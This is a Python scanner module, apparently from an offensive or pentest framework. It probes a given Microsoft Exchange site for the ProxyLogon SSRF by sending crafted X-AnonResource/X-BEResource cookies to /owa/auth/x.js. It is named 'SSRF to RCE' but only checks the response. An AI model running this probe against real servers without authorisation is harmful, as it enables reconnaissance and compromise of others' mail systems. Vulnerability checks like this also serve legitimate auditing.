import requests
from core.printmodels import *
import struct
import base64

class Exchange_SSRF_RCE:
    def __init__(self):
        self.name = "Exchange Server SSRF to RCE"
        self.description = "Microsoft Exchange Server SSRF (ProxyLogon)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                "Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;",
                "User-Agent": "Mozilla/5.0",
                "Accept-Encoding": "gzip, deflate"
            }
            
            target = f"{site}/owa/auth/x.js"
            response = requests.get(target, headers=headers, verify=False, timeout=10)
            
            if response.status_code == 500 and "NegotiateSecurityContext" in response.text:
                return PrintSuccess(f"[Exchange] Vulnerable to ProxyLogon!")
            return PrintFailed("[Exchange] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Exchange] Error: {str(e)}")
